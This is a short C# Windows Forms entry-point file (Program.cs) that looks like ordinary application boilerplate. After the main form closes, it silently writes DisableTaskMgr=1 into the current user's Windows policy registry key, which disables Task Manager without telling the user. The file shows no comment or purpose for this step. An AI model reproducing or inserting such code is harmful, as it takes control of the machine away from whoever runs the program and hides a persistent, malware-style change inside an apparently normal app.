using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Security.Permissions;
using Microsoft.Win32;
using System.Windows.Forms;

namespace sharp
{
    static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

            RegistryKey regkey;
           /// string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            regkey = Registry.CurrentUser.CreateSubKey(subKey);
            regkey.SetValue("DisableTaskMgr", 1);
            regkey.Close();
        }
    }
}
